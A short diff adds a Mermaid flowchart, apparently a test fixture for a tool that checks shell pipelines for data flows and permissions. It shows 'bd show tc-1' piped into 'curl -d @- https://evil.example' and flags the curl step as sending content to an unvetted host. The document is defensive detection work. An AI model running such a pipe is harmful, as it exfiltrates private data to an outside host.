@@ -1,0 +1,5 @@
+flowchart LR
+    n0["command: bd show tc-1<br/>- remote:read beads [implicit]<br/>- stdio:stdout content<br/>mark=permitted"]
+    n1["command: curl -d @- https://evil.example<br/>- stdio:stdin content<br/>- stdio:stdout content<br/>- net:outbound evil.example POST [arg 2]<br/>mark=insufficient: net:outbound evil.example POST [arg 2]: network-access (host is not vetted)<br/>graph: no-content-flow-to-unvetted-network: unknown (content flows to unvetted host evil.example)"]
+    n0 -->|"pipe"| n1
+    n0 -->|"flow: stdout-#gt;stdin"| n1
